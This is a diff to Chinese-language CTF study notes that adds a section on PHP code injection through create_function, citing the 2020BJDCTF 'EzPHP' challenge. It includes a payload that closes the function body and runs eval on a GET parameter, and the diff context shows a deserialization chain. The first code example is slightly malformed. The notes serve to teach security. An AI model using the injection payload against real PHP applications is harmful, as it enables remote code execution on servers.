@@ -194,7 +194,30 @@ echo urlencode(serialize(new acp(new ace(serialize(new acp(""))))));
 //$d = new acp($c);
 //echo urlencode(serialize($d));
 ```
-## NSSCTF prize
+# 执行漏洞
+
+## 2020BJDCTF “EzPHP”
+https://www.gem-love.com/ctf/770.html
+
+```php
+<?php
+$myFunc = create_function('$a', '$b', 'return($a+$b);')
+print_r($myFunc(1,2));
+```
+
+实际上 myFunc() 就相当于:
+```php
+function myFunc($a, $b){
+    return $a+$b;
+}
+```
+
+这看似正常，实则充满危险。由于 $code 可控，底层又没有响应的保护参数，就导致出现了代码注入。见如下例子：
+```php
+<?php
+$myFunc = create_function('$a, $b', 'return($a+$b);}eval($_GET[\'c\']);//');
+```
+
 # SSTI
 
 ## SSTI | 入门 | [FBCTF2019]Event
